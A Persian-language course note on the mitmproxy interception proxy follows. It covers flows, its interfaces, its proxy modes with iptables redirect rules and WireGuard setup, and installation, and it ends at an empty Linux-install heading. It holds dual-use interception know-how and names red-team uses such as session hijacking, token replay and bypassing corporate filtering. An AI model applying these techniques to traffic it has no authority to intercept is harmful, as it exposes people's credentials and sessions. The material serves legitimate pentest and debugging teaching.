---
Episode: E6
Date: 2026-05-08T18:28:00
Title: E5-MITM-mitmproxy
tags:
  - Networking
  - network_security
  - network_attacks
  - Network_Pentest
  - Network_Attacks_Anatomy
Categories:
  - Networking
  - Network Pentesting
  - Network Security
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
--------
#### 5: mitmproxy
##### Basics
ابزار mitmproxy یک پروکسی تعاملی و قدرتمند برای تحلیل، دستکاری و بازپخش ترافیک HTTP و HTTPS است. برخلاف بسیاری از ابزارهای مشابه که صرفاً بر شنود ترافیک متمرکزند، mitmproxy به ما این امکان را می‌دهد که به صورت زنده و تعاملی، محتوای درخواست‌ها و پاسخ‌های وب را مشاهده، متوقف، ویرایش، و دوباره ارسال کنیم. این قابلیت، آن را به یک ابزار استاندارد و ضروری در تست نفوذ برنامه‌های وب، دیباگ توسعه API و تحلیل بدافزارها تبدیل کرده است.
###### Introduction & History
ابزار mitmproxy در ابتدا به عنوان یک پروژه شخصی توسط Aldo Cortesi ایجاد و در سال 2010 به صورت عمومی منتشر شد. از آن زمان، این پروژه مسیر توسعه بلند و پرباری را طی کرده است. یکی از نقاط عطف مهم آن، در نسخه 0.18 (حدود اکتبر 2016) با "بازنویسی بزرگ" (Refactor) معماری داخلی آن به سیستم ماژولار مبتنی بر Addon ها رخ داد که قابلیت توسعه‌پذیری آن را به شدت افزایش داد. نقطه عطف دیگر، در نسخه 7 (اواخر 2020) با پیاده‌سازی یک هسته پروکسی کاملاً جدید بر پایه الگوی "Sans I/O" (بدون ورودی/خروجی) بود که پایداری و قابلیت اطمینان آن را به سطح جدیدی ارتقا داد، مخصوصاً در پشتیبانی از HTTP/2 و WebSocket

- آدرس مخزن گیت‌هاب mitmproxy:
	- https://github.com/mitmproxy/mitmproxy
- آدرس مخزن گیت‌هاب Aldo Cortesi:
	- https://github.com/cortesi
###### mitmproxy Features
ویژگی های اصلی mitmproxy عبارتند از:

1. **پروکسی HTTP/HTTPS با قابلیت رهگیری (Interception):** برخلاف ابزارهایی که فقط ترافیک را نمایش می‌دهند، mitmproxy به ما این امکان را می‌دهد که یک درخواست یا پاسخ را پیش از رسیدن به مقصد، "متوقف" کرده، محتوای آن را تغییر داده و سپس "ادامه" دهیم.

2. **فیلتر کردن هوشمند (Filtering):** به کمک یک زبان فیلترینگ قدرتمند، می‌توانیم فقط ترافیک مورد نظر خود را مشاهده و پردازش کنیم. مثلاً:
	- `~d example.com` فقط نمایش درخواست های `example.com`

3. **پشتیبانی از پروتکل‌های مدرن:** از HTTP/1.1، HTTP/2 و WebSocket پشتیبانی کامل می‌کند و امکان تحلیل ترافیک بلادرنگ (Real-Time) برنامه‌های تحت وب مدرن را فراهم می‌سازد.
    
4. **حالت‌های Proxy متنوع:** از حالت‌های مختلفی برای مسیریابی ترافیک پشتیبانی می‌کند:
	- **Regular Proxy:** حالت استاندارد که در تنظیمات پروکسی مرورگر یا سیستم عامل تنظیم می‌شود.
        
    - **Transparent Proxy:** ترافیک شبکه در سطح بسته‌ها به سمت پروکسی هدایت می‌شود، بدون آنکه کلاینت از وجود پروکسی مطلع باشد.
        
    - **Reverse Proxy:** ترافیک ورودی را به یک سرور پشتیبان مشخص هدایت می‌کند که برای تست سرورهای وب کاربرد دارد.
        
5. **ساخت گواهی TLS/SSL درجا (On-the-fly Certificates):** mitmproxy برای رهگیری ترافیک HTTPS، به صورت خودکار برای هر دامنه یک گواهی دیجیتال معتبر صادر می‌کند که توسط گواهی ریشه (CA) mitmproxy امضا شده است. با نصب این CA بر روی کلاینت، تمام ترافیک HTTPS رمزگشایی می‌شود.
    
6. **اسکریپت‌نویسی قدرتمند با Python:** این مهم‌ترین ویژگی تمایز دهنده mitmproxy است. ما می‌توانیم اسکریپت‌های پایتون بنویسیم که با "قلاب‌ها" (Hooks) به رویدادهای مختلف پروکسی (مانند شروع یک درخواست یا دریافت پاسخ) متصل شده و ترافیک را به صورت برنامه‌نویسی‌شده تحلیل یا دستکاری کنند.

###### mitmproxy Usages
از mitmproxy در موارد زیادی استفاده میشود، مثلا

1. **تحلیل و دیباگ API:** مشاهده و تحلیل تمامی درخواست‌ها و پاسخ‌های HTTP(S) رد و بدل شده بین برنامه‌ها و سرورها.
    
2. **توسعه و تست امنیت برنامه‌های وب:** دستکاری هوشمندانه ترافیک برای تست آسیب‌پذیری‌هایی مانند XSS، SQLi، و دور زدن منطق سمت کلاینت.
    
3. **مهندسی معکوس API های موبایل:** شنود و تحلیل ترافیک اپلیکیشن‌های موبایل با نصب گواهی CA ابزار بر روی دستگاه.
    
4. **ایجاد ابزارهای سفارشی:** استفاده از اسکریپت‌نویسی Python برای ایجاد پروکسی‌های هوشمند با قابلیت تغییر خودکار داده‌ها.

###### mitmproxy Interfaces
هنگامیکه mitmproxy را نصب میکنیم سه نرم افزار `mitmproxy, mitmweb, mitmdump` بر روی ماشین مان نصب میشود. درواقع mitmproxy یک مجموعه نرم‌افزار و سیستم است که از سه زیر ابزار داخلی تشکیل شده که هر کدام ویژگی خود را دارند:

1. **واسط کاربری اصلی mitmproxy:**
	- یک واسط کاربری تعاملی مبتنی بر ترمینال (کنسول) که برای کار در محیط‌های بدون گرافیک و سرورها ایده‌آل است و کنترل کامل و سریعی را با صفحه کلید فراهم می‌کند.
    
2. **واسط کاربری وب mitmweb:**
	- یک واسط کاربری تحت وب که تمام قابلیت‌های ابزار را از طریق مرورگر گرافیکی در دسترس قرار می‌دهد و برای مرور و تحلیل بصری ترافیک بسیار مناسب است.
    
3. **ابزار mitmdump:**
	- یک نسخه غیرتعاملی و خط فرمان که خروجی ترافیک را به صورت جریانی (Stream) چاپ می‌کند. این ابزار برای پردازش خودکار ترافیک با اسکریپت‌ها و یا ذخیره‌سازی آن‌ها در فایل برای تحلیل‌های بعدی استفاده می‌شود.

###### mitmproxy Parts
مجموعه ابزار mitmproxy از چندین بخش اصلی تشکیل شده است.هر یک از این بخش ها وظیفه خود را دارند و همگی درکنار هم سیستم mitmproxy را پیش میبرند:

1. **سیستم Addonها (ماژول‌ها و پلاگین‌ها):** 
	- معماری mitmproxy از نسخه 0.18 به بعد، به طور کامل ماژولار است. تمام قابلیت‌های اصلی پروکسی، خود به صورت Addon هایی پیاده‌سازی شده‌اند که از یک API مشترک پیروی می‌کنند. این سیستم است که به ما اجازه می‌دهد تا "پلاگین‌ها" یا "ماژول‌های" سفارشی خود را بنویسیم و بدون دست زدن به کد اصلی برنامه، قابلیت‌های جدیدی را به آن اضافه کنیم. اسکریپت‌های پایتون نیز در واقع در همین چارچوب اجرا می‌شوند.
    
2. **قلاب‌ها (Hooks) و API اسکریپت‌نویسی:** 
	- ابزار mitmproxy مجموعه وسیعی از "Hooks" ها را ارائه می‌دهد که نقاط ورود خاصی در چرخه عمر یک درخواست هستند. برای نمونه، قلاب `request` قبل از ارسال درخواست به سرور و قلاب `response` بعد از دریافت پاسخ از سرور فراخوانی می‌شود. با استفاده از API قدرتمند `mitmproxy.flow` در اسکریپت‌های پایتون میتوانیم به این رویدادها متصل می‌شویم.
    
3. **فایل‌های Flow (ذخیره و بازپخش):** 
	- ابزار mitmproxy می‌تواند تمامی جریان‌های ترافیکی (Flows) را به همراه تمام جزئیات درخواست و پاسخ در فایل‌هایی با فرمت مخصوص خود ذخیره کند. این فایل‌ها را می‌توان بعداً برای تحلیل آفلاین بارگذاری کرده یا حتی ترافیک ذخیره‌شده را "بازپخش" (Replay) کرد.
    
4. **موتور Options:** 
	- تمامی تنظیمات mitmproxy از طریق یک موتور قدرتمند و یکپارچه به نام Options مدیریت می‌شود. این سیستم به ما اجازه می‌دهد رفتار ابزار را از طریق فایل `config.yaml`، خط فرمان، یا به صورت تعاملی در حین اجرا (با کلید `O` در mitmproxy) تغییر دهیم. این خود یک قابلیت پیشرفته و قابل توسعه توسط Addonهای شخصی است.

##### mitmproxy Special Concepts
برای درک mitmproxy و کار با آن نیاز داریم تا یکسری از مفاهیم را mitmproxy از آنها استفاده میکند را بررسی کنیم. در ادامه به بررسی این موضوعات میپردازیم.
###### Flow
در mitmproxy بنیادی ترین واحد داده ای Flow است. Flow یک آبجکت است که نماینده یک «تعامل کامل شبکه‌ای» بین کلاینت و سرور است. به بیان دقیق Flow یک ساختار داده است که شامل تمام اطلاعات مرتبط با یک تراکنش شبکه‌ای در طول چرخه کامل آن می‌باشد. انواع Flow را در جدول زیر مشاهده میکنید:

| نوع           | توضیح               |
| ------------- | ------------------- |
| HTTPFlow      | درخواست و پاسخ HTTP |
| TCPFlow       | اتصال TCP خام       |
| WebSocketFlow | ارتباط WebSocket    |
| UDPFlow       | در حالت‌های خاص     |

ساختار HTTPFlow به شرح زیر است:
- Client Connection
- Server Connection
- Request Object
- Response Object
- Error Object
- Timestamps
- Metadata

چرخه حیات Flow:
- Client connects
- Request captured
- TLS decrypt (در صورت نیاز)
- Forward to server
- Receive response
- Modify (در صورت اسکریپت)
- Return to client
- Close connection

- **چرا Flow مهم است؟** از Flow در حملات و موارد بسیاری استفاده میشود. این موارد عبارتند از:
	- Credential Leakage Analysis
	- Session Hijacking
	- API Abuse
	- Token Replay
	- Forensic Reconstruction

- **نکته:** Flow پکت نیست و نباید این دو رو باهم یکی کنیم. در جدول زیر تفاوت Flow با Packet را مشاهده میکنید:

|Packet|Flow|
|---|---|
|سطح پایین|سطح Application|
|شامل Header شبکه|شامل کل تراکنش|
|مستقل|Context-aware|

###### Onboarding
- **تعریف دقیق:**
	- ویژگی Onboarding یک Web Interface داخلی است که به کاربران جدید در موارد زیر کمک می‌کند:
		- نصب Certificate
		- تست صحت نصب
		- بررسی وضعیت پراکسی

برای اجرای mitmproxy در حالت Onboarding از فلگ زیر استفاده میشود:
`--app-host 0.0.0.0` یا `--app-host 127.0.0.1`

- **این ویژگی دقیقاً چه کاری انجام می‌دهد؟**
ابزار mitmproxy یک Web App داخلی روی آدرس `http://mitm.it` راه‌اندازی می‌کند. سپس کاربر وقتی این آدرس را باز کند:
	- لینک دانلود CA Certificate نمایش داده می‌شود.
	- راهنمای نصب برای سیستم عامل‌های مختلف نمایش

- **نکته:**
	در نسخه های جدید mitmproxy دیگر از فلگ `app-host--` پشتیبانی نمیشود. در واقع در نسخه های جدید پس از تنظیم پراکسی بر روی سیستم بصورت خودکار با رفتن به `http://mitm.it` در مرورگر میتوانید Certificate های مورد نیاز را به همراه دستورالعمل استفاده از آنها مشاهده کنید.
###### `mitmproxy` - Main Part
ابزار Mitmproxy شامل سه ابزار اصلی است:

- **mitmproxy** (مبتنی بر TUI)
- **mitmdump** (CLI و Script Automation)
- **mitmweb** (Web Interface)
هر سه ابزار از یک موتور مشترک استفاده می‌کنند اما برای اهداف متفاوت طراحی شده‌اند.

- **ابزار mitmproxy** (رابط تعاملی مبتنی بر ترمینال – Interactive TUI):

- **ماهیت و معماری:**
	- این نسخه یک **Terminal User Interface (TUI)** است که برای تحلیل تعاملی و گام‌به‌گام ترافیک طراحی شده است.
	- تمرکز آن بر قابلیت **Inspect, Intercept, Modify** در لحظه است.

- **امکانات کلیدی:**
	- نمایش زنده Request/Response
	- امکان Edit درخواست‌ها
	- توانایی Replay
	- فیلتر پیشرفته Flowها
	- تعامل مستقیم با HTTP/HTTPS/HTTP2
	- مناسب برای Debugging و تحلیل لحظه‌ای

- **کاربردهای عملیاتی:**
	- تحلیل APIها در تست نفوذ
	- مهندسی معکوس ترافیک موبایل
	- رهگیری Session Tokens و Cookies
	- تحلیل حملات App-Layer
	- مشاهده TLS Decryption در لحظه

- **نحوه اجرا:**
```sh
#Linux
mitmproxy

#Windows 
mitmproxy.exe
```
###### `mitmweb` Web Interface
- **ابزار mitmweb** (واسط وب گرافیکی – GUI):

- **ماهیت:**
	- یک رابط وب کامل با داشبورد گرافیکی برای مشاهده ترافیک.
	- برای کاربرانی که تجربه کم‌تری دارند بسیار مناسب است.

- **قابلیت‌ها:**
	- مشاهده زنده ترافیک در GUI
	- مرور آسان Request/Response
	- ابزار جست‌وجو و فیلتر
	- نمایش ساختار JSON و WebSocket
	- مناسب تست API
	- اعمال Options بصورت لحظه ای و آسان

- **کاربردهای عملیاتی:**
	- تحلیل API در تیم‌های توسعه
	- تحلیل ترافیک شبکه در شبکه‌های سازمانی
	- کاربرد Blue Team برای Visual Inspection
	- آموزش و نمایش مفاهیم به تیم‌ها

- **نحوه اجرا:**
```sh
#Linux
mitmweb

#Windows 
mitmweb.exe
```

- سپس در مرورگر: `http://127.0.0.1:8081` 

###### `mitmdump` CLI Mode for Scripting & Automation
- **ابزار mitmdump** (نسخه CLI برای اتوماسیون، اسکریپت‌نویسی و پردازش انبوه)

- **ماهیت:**
	- ابزار mitmdump نسخه‌ای بدون رابط گرافیکی است و مناسب Automation و Scripting است.
	- این نسخه شبیه tcpdump برای HTTP/TLS رفتار می‌کند.

- **قابلیت‌ها:**
	- اجرای اسکریپت‌های Python
	- ذخیره‌سازی جریان شبکه
	- قابل استفاده در Pipelineهای CI/CD
	- سرعت بالاتر نسبت به mitmproxy
	- پردازش Batch

- **کاربردهای امنیتی:**
	- اجرای حملات خودکار (مانند Mass Request Modification)
	- تحلیل انبوه ترافیک
	- ساخت ابزارهای تخصصی Red Team
	- استخراج Indicator ها در DFIR
	- ساخت فازهای Automation در Web Testing

- **نحوه اجرا:**
```sh
#for running with Python Script
mitmdump -s script.py

#Or Capture and Save Traffic
mitmdump -w outputfile
```
- **نکته:** استفاده از اسکریپت های پایتونی در `mitmproxy` هم ممکن است. فلگ مربوط `s-` یا `script--` میباشد.
###### Proxy Modes in mitmproxy
ابزار mitmproxy یک man‑in‑the‑middle intercepting proxy engine است که قابلیت کار در چندین حالت عملکردی (Proxy Modes) را دارد. هر حالت دارای معماری، رفتار متمایز است که این موضوع باعث شده که هر کدام در سناریوهای مختلفی کاربرد داشته باشند. انتخاب صحیح حالت برای سناریوی درست از اصول کلیدی در عملیات Red Team و تحلیل شبکه است.

1. **حالت اول Regular Proxy (یا Explicit / Forward Proxy):**
در این حالت، mitmproxy همانند یک proxy سرراست عمل می‌کند که کلاینت صراحتاً (explicitly) به آن تنظیم می‌شود و تمامی درخواست‌ها مستقیماً از طریق آن عبور می‌کنند.
```
[Client] ---> [mitmproxy:8080] ---> [Server]
```

- **ویژگی ها:**
	- برای کار کردن، کلاینت باید پراکسی را در تنظیمات خود مشخص کند (Manual Proxy یا Environment Variable).
	- پروتکل‌های پشتیبانی‌شده: HTTP, HTTPS (با TLS Interception)، WebSocket.
	- امکان کامل‌ برای مشاهده (`flow.request` / `flow.response`) و تغییر محتوا.
	- ساده‌ترین و پایدارترین حالت برای آزمایش‌های محلی.

- **سناریوهای استفاده:**
	- تحلیل ترافیک HTTP/HTTPS در مرورگر یا اپلیکیشن‌های دسکتاپ.
	- تست نفوذ و رهگیری Sessionها.
	- مهندسی رفتار APIهای REST.
	- محیط‌های آموزشی و بررسی certificate pinning.

- **اجرای نمونه:**
```sh
mitmproxy --listen-host 0.0.0.0 --listen-port 8080
```

---------

2. **حالت دوم Transparent Proxy (یا Intercepting Proxy):**
در حالت Transparent ابزار mitmproxy به شکل غیرمستقیم و بدون تنظیم در کلاینت بین مسیر قرار می‌گیرد. ابزار در مسیر شبکه یا Gateway مستقر می‌شود و ترافیک را با استفاده از قوانین فایروال مثل `iptables` یا `pf` به خودش Redirect می‌کند.
```
[Client] ---> (iptables REDIRECT) ---> [mitmproxy:8080] ---> [Server]
```

- **ویژگی‌ها:**
	- کلاینت از وجود پراکسی بی‌خبر است.
	- نیاز به پیکربندی سیستم یا Gateway برای NAT/Redirect دارد.
	- ابزار mitmproxy از بسته‌ها مقصد اصلی را استخراج کرده و درخواست را بازسازی می‌کند.
	- برای HTTPS نیازمند نصب گواهی CA در کلاینت است.
	- پشتیبانی از IPv4 و IPv6، TCP-level MIDM

- **سناریوهای استفاده:**
	- مانیتورینگ شبکه سازمانی بدون تغییر تنظیمات کاربران.
	- عملیاتی در Red Team برای استراق اطلاعات بین Endpoint و سرور.
	- تست نفوذ شبکه‌های IoT یا موبایل در محیط NAT.
	- آزمایش رفتار بدافزارها در sandbox.

- **اجرای نمونه:**
```sh
mitmproxy --mode transparent --listen-port 8080
```

**و سپس تنظیم قوانین `iptables`:**
```sh
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

----------

3. **حالت سوم Reverse Proxy:**
در این حالت mitmproxy در سمت سرور مستقر می‌شود و نقش یک Proxy معکوس (Reverse) را بین کاربران اینترنت و سرور واقعی ایفا می‌کند.
```
[Client] ---> [mitmproxy:443] ---> [Backend Server e.g. 10.0.0.5:443]
```

- **ویژگی‌ها:**
	- ابزار mitmproxy درخواست‌ها را بر اساس Host یا مسیر به سرور مقصد ارسال می‌کند.
	- در این حالت، mitmproxy گواهی TLS خودش را برای کلاینت ارائه می‌دهد (معمولاً از گواهی واقعی سرور استفاده می‌شود یا با `cert--`).
	- نیازی نیست کلاینت گواهی CA را بشناسد، زیرا mitmproxy همانند سرور واقعی رفتار می‌کند.

- **سناریوهای استفاده:**
	- تست امنیتی API یا portal های وب در حالت production بدون تغییر کلاینت.
	- شبیه‌سازی حملات Reverse Engineering به سرورهای تحت HTTPS.
	- درج (injection) کد، هدر یا payload برای بررسی حمله XSS، CSRF، SSRF.
	- لایه دفاعی اولیه برای تجزیه ترافیک ورودی شبکه.

- **اجرای نمونه:**
```sh
mitmproxy --mode reverse:https://targetserver.com

#یا با تعیین مقصد خاص:
mitmproxy --mode reverse:http://192.168.10.5:80 --set ssl_insecure=true
```

---------

4. **حالت چهارم Upstream Proxy:**
در حالت Upstream ابزار mitmproxy خودش client یک Proxy دیگر است و تمام درخواست‌ها را به Proxy ثانویه ارسال می‌کند.
```
[Client] ---> [mitmproxy] ---> [Upstream proxy] ---> [Server]
```

- **ویژگی‌ها:**
	- برای زنجیره‌سازی چند پرکسی (Proxy Chaining).
	- پشتیبانی از Authentication در سطح Upstream.
	- قابل استفاده در شبکه‌هایی که خروج مستقیم به اینترنت مسدود است.
	- ابزار mitmproxy همچنان قابلیت بررسی، دستکاری و log را حفظ می‌کند.

- **سناریوهای استفاده:**
	- عبور از Perimeter Proxy سازمانی در تست نفوذ.
	- اجرا در sandbox های با دسترسی محدود.
	- تنظیم proxy در transparent gateway ولی با خروجی upstream سازمانی.

- **اجرای نمونه:**
```sh
mitmproxy --mode upstream:http://corporateproxy.local:3128
```

---------

5. **حالت پنجم SOCKS Proxy:**
در این حالت mitmproxy مانند SOCKS5 Proxy عمل می‌کند و امکان عبور از لایه چهار Layer 4 را فراهم می‌کند.
```
[Client] ---> [mitmproxy SOCKS5] ---> [Server]
```

- **ویژگی‌ها:**
	- پشتیبانی از پروتکل‌های غیر HTTP.
	- قابلیت تحلیل ترافیک خام TCP (در کنار Script/Addon).
	- مناسب برای تحلیل پوسته‌های تونل‌ شده.

- **اجرای نمونه:**
```sh
mitmproxy --mode socks5
```
###### WireGuard Mode in mitmproxy
در نسخه‌های جدید mitmproxy، حالتی با عنوان **WireGuard Mode** معرفی شده است که در نگاه اول ممکن است به‌عنوان یک «Proxy Mode» تلقی شود؛ اما از منظر معماری شبکه، این ویژگی یک **Transport‑Level Tunneling Mechanism مبتنی بر VPN** است، نه یک Forward/Reverse Proxy کلاسیک.
در این بخش، WireGuard Mode را در سطح معماری، عملکرد، مزایا، سناریوهای عملیاتی Red/Blue Team و مقایسه با سایر Modeها تحلیل می‌کنیم.

- **تعریف:**
حالت WireGuard Mode در mitmproxy یک **لایه تونل رمزگذاری‌شده مبتنی بر پروتکل VPN WireGuard** است که امکان هدایت تمام ترافیک یک دستگاه یا سیستم به mitmproxy را بدون نیاز به تنظیم Proxy در کلاینت فراهم می‌کند.
به بیان دقیق‌تر:
ابزار mitmproxy در این حالت یک **VPN endpoint مبتنی بر WireGuard** ایجاد می‌کند و کلاینت به‌جای تنظیم Proxy، به یک VPN متصل می‌شود.
در WireGuard Mode حالت معماری به شکل زیر است:
```
[Client Device]
        |
   (WireGuard VPN Tunnel)
        |
   [mitmproxy WireGuard Endpoint]
        |
     Internet
```
- مراحل عملیاتی:
	1. ابزار mitmproxy یک Interface مجازی WireGuard ایجاد می‌کند.
	2. کلاینت با Private/Public Key Pair به آن متصل می‌شود.
	3. تمام ترافیک کلاینت از طریق Tunnel عبور می‌کند.
	4. ابزار mitmproxy ترافیک را دریافت، decrypt، تبدیل به Flow و پردازش می‌کند.

------------

- **چرا WireGuard به mitmproxy اضافه شد؟**
مشکلاتی که قبلاً وجود داشت
1. مشکل 1 — محدودیت Transparent Proxy
	- نیاز به iptables
	- نیاز به دسترسی Root
	- پیچیدگی در شبکه‌های پیچیده
	- مشکل در شبکه‌های موبایل

2. مشکل 2 — محدودیت Regular Proxy
	- نیاز به تنظیم دستی Proxy در کلاینت
	- بسیاری از اپلیکیشن‌ها تنظیم Proxy را نادیده می‌گیرند
	- برخی اپ‌ها فقط TCP raw یا QUIC استفاده می‌کنند

3. مشکل 3 — تحلیل موبایل سخت بود
	- روی اندروید/iOS نیاز به تغییر تنظیمات Proxy
	- اپلیکیشن‌ها Proxy-aware نبودند
	- فرآیند certificate pinning و bypass پیچیده‌تر بود.

- **راه حل WireGuard Mode:**
	1. نیاز به تغییر تنظیم Proxy ندارد.
	2. نیازی به iptables و NAT ندارد.
	3. برای موبایل بسیار ساده‌تر است.
	4. تمام ترافیک IP را منتقل می‌کند.
	5. برای سناریوهای واقعی‌تر مناسب‌تر است.

-----------

- **اجرای mitmproxy در حالت WireGuard Mode:**
```sh
mitmproxy --mode wireguard
#or
mitmweb --mode wireguard
```

پس از اجرا:
- یک فایل کانفیگ WireGuard تولید می‌شود
- شامل Private/Public Key
- شامل IP تونل (مثلاً 10.0.0.1)
این فایل باید در کلاینت WireGuard import شود.

---------

**مزایا و معایب:**
- **مزایای امنیتی WireGuard Mode:**
	- ایمن‌تر از Transparent Proxy
	- نیازی به Root-level packet redirect ندارد
	- مستقل از ساختار داخلی شبکه
	- عبور کامل از محدودیت Proxy-aware application

- **محدودیت ها و چالش ها:**
	- اگر اپلیکیشن از QUIC / HTTP3 استفاده کند، فرآیند TLS Interception ممکن نیست و باید QUIC غیرفعال شود.
	- حالت WireGuard مشکل Certificate Pinning را حل نمی‌کند، چون Pinning در سطح TLS است.
	- در برخی سناریوها نیاز به routing policy پیشرفته دارید.

---------

- **سناریو های عملیاتی استفاده از WireGuard Mode:**
1. سناریو 1 — تحلیل ترافیک و تست نفوذ موبایل:
	- نصب WireGuard روی Android/iOS
	- وارد کردن import فایل config
	- فعال کردن VPN
	- سپس:
		- تمام ترافیک اپلیکیشن‌ها رهگیری می‌شود.
		- نیازی به تنظیم Proxy در WiFi نیست.
		- حتی اپ‌هایی که Proxy را ignore می‌کنند نیز رهگیری می‌شوند.

2. سناریو 2 — تحلیل IoT Device:
	- برخی دیوایس های IOT ویژگی Proxy را پشتیبانی نمی‌کنند و یا امکان تنظیم دستی ندارند. در اینجا اگر Gateway آن‌ها به WireGuard متصل شود:
		- تمام ترافیک عبور می‌کند.
		- بدون تغییر در Firmware

3. سناریو 3 — در عملیات Red Team درون شبکه سازمانی:
	- نصب WireGuard روی Endpoint
	- اتصال به mitmproxy خارج از شبکه
	- سپس:
		- مانیتورینگ ترافیک بدون تغییر Proxy
		- قابل استفاده در عملیات C2 simulation

4. سناریو 4 — Blue Team و Sandboxing - تحلیل بدافزار:
	- ماشین آلوده به WireGuard متصل می‌شود.
	- تمام ترافیک خروجی از طریق mitmproxy عبور می‌کند.
	- سپس:
		- ثبت دقیق Flowها
		- تحلیل DNS, HTTP, TLS
		- امکان Block یا Modify

--------

- **تفاوت WireGuard با Transparent Mode**

| ویژگی                | Transparent | WireGuard           |
| -------------------- | ----------- | ------------------- |
| نیاز به iptables     | بله         | خیر                 |
| نیاز به تغییر کلاینت | خیر         | نیاز به VPN profile |
| سطح کار              | L3 NAT      | L3 Tunnel           |
| موبایل friendly      | متوسط       | بسیار مناسب         |
| پیچیدگی راه‌اندازی   | بالا        | متوسط               |

###### UP Stream Server
در زمانیکه mitmproxy را در حالت UP Stream اجرا میکنیم، **Upstream Server** به سروری گفته می‌شود که mitmproxy درخواست را پس از دریافت از کلاینت، به آن ارسال می‌کند. در معماری استاندارد:
```
Client → mitmproxy → Upstream Server
```

در واقع در حالت عملی Regular Mode ابزار mitmproxy به شکل زیر کار میکند:
```
Client → mitmproxy → Target Server (Internet)
```

اما در حالت Up Stream کارایی ابزار به شکل زیر میباشد:
```
Client → mitmproxy → Upstream Proxy → Target Server
```
یعنی mitmproxy خودش به یک پراکسی دیگر متصل می‌شود.

- **مثال استفاده:**
فرض کنید در یک سازمان:
- همه ترافیک خروجی باید از یک Corporate Proxy عبور کند.
- آدرس آن: 192.168.1.10:8080

اجرای mitmproxy:
```sh
mitmproxy --mode upstream:http://192.168.1.10:8080
```

جریان ترافیک:
	`Browser → mitmproxy → Corporate Proxy → Internet`

- **کاربردهای امنیتی UP Stream**:
- Red Team:
	- عبور از فیلترینگ سازمانی
	- زنجیره‌سازی پراکسی‌ها
	- پیاده سازی Pivoting در شبکه داخلی

- Blue Team:
	- تحلیل ترافیک قبل از خروج از شبکه
	- اعمال DLP
	- ثبت رفتار مشکوک کاربران

##### mitmproxy Installation
###### Prerequisite - Install `pipx`
برای نصب mitmproxy روش های متفاوتی وجود دارد که یکی از این روش ها استفاده از `pipx` است که در ویندوز و لینوکس میتوان از آن استفاده کرد. 
ابزار `pipx` در واقع برای نصب کتابخانه ها و ابزارهای پایتونی در محیط ایزوله استفاده میشود. نکته اینجاست که برای استفاده از `pipx` نیاز است که ابتدا Python بر روی سیستم عامل مان نصب باشد. 
پیشنهاد میشود آخرین ورژن Python را به همراه `pipx` در ویندوز یا لینوکس خود نصب کنید، زیرا در ادامه برای نصب ابزارهای دیگری هم مانند `dnschef-ng` میتوان از `pipx` استفاده کرد. در ادامه روش نصب Python و `pipx` را در ویندوز و لینوکس های دبیان را بررسی میکنیم.
برای مشاهده روش نصب پایتون به فصل Perquisites (پیش‌نیازها) و سپس Necessary Tools مراجعه کنید.

- **نصب `pipx`**
1. **نصب `pipx` در لینوکس ها (Debian, RedHat, Arch)- بوسیله Python Package Manager `pip`**
	- از این روش در تمامی توزیع های لینوکس میتوان استفاده کرد.
```sh
#1-Install pipx using Python Package Manager
python3 -m pip install --user pipx
python3 -m pipx ensurepath
#or 
pip install --user pipx
pipx ensurepath
```

2. **نصب `pipx` در لینوکس (Debian, RedHat, Arch) - بوسیله Package Manager ها**
	- ممکن است `pipx` در تمامی برخی مخزن ها موجود نباشد و بنابراین بهترین روش استفاده از روش اول `pip` است.
```sh
#Debian Based Linux (Debian / Ubuntu / Kali / Linux Mint)
sudo apt update
sudo apt install pipx
sudo pipx ensurepath

#Red-Hat Based Linux (RedHat/CentOS/Fedora/AlmaLinux/Rocky)
sudo dnf install pipx
#or in old Red-Hat Linux
sudo yum install pipx
pipx ensurepath

#Arch Linux (Arch/Black Arch/Manjaro)
sudo pacman -S pipx
pipx ensurepath
```

3. **نصب `pipx` در ویندوز**
```powershell
#1-Using Python Package Manager - در اکثر مواقع کافیست
python -m pip install --user pipx
pipx ensurepath

#Using Scoop Package Manager - در صورت لزوم
scoop install pipx
pipx ensurepath

#Using Winget Package Manager - در صورت لزوم
winget install pipxproject.pipx
pipx ensurepath
```

4. **نصب در macOS:**
```sh
brew install pipx
pipx ensurepath
```

- **از این پس:**
	- همیشه از `pipx` به جای `pip install --user` برای نصب ابزارهایی مانند `black`، `poetry`، `httpie`، `ansible` استفاده کنید.
	- روی Linux بسته‌های سیستمی را با pip نصب نکنید. همیشه از `--user` یا `pipx` استفاده کنید.
###### mitmproxy Installation on Windows
در این بخش، مراحل نصب قدم به قدم mitmproxy را در سیستم‌عامل‌های لینوکس و ویندوز با هم انجام می‌دهیم. توصیه می‌شود برای دریافت آخرین نسخه و داشتن تمامی وابستگی‌ها به صورت یکجا، از بسته‌های باینری مستقل (Standalone Binaries) که توسط تیم اصلی توسعه ارائه می‌شود استفاده کنیم. این روش نیاز به نصب جداگانه پایتون را برطرف می‌کند.

1. **روش اول: نصب از طریق `pipx`**
```powershell
#1: نصب mitmproxy
pipx install mitmproxy

#2: ریستارت کردن ترمینال

#3: بررسی موفقیت آمیز بودن نصب با اجرای کامندهای زیر
mitmdump.exe --version
mitmproxy.exe --version
mitmweb.exe --version
```

2. **روش دوم: نصب از طریق فایل اجرایی**
	1. **دانلود:** به وب‌سایت رسمی `mitmproxy.org` رفته و آخرین نسخه فایل نصب‌کننده (Installer) ویندوز با پسوند `.exe` را دانلود می‌کنیم.
		- https://www.mintlify.com/mitmproxy/mitmproxy/installation
    
	2. **اجرای نصب‌کننده:** فایل دانلود شده را اجرا کرده و مراحل ساده نصب را دنبال می‌کنیم. نصب‌کننده به طور خودکار مسیر نصب را به متغیر `PATH` سیستم اضافه می‌کند تا از همه جای ترمینال به ابزارها دسترسی داشته باشیم.
    
	3. **تأیید نصب:** یک ترمینال جدید (PowerShell یا Windows Terminal) باز کرده و با اجرای دستورات زیر، نصب موفق را تأیید می‌کنیم:
```powershell
mitmproxy --version
mitmweb --version
mitmdump --version
```

3. **روش سوم: نصب از طریق Microsoft Store**
	- به تازگی mitmproxy در Microsoft Store هم قرار گرفته که براحتی میتوان برای نصب ابزار از این روش استفاده کرد. ویژگی این روش این است که با فعال کردن گزینه Auto Update مطمئن خواهید بود که همیشه از آخرین نسخه mitmproxy استفاده خواهید کرد. 
###### mitmproxy Installation on Linux
**روش اول: نصب از طریق `pipx`**
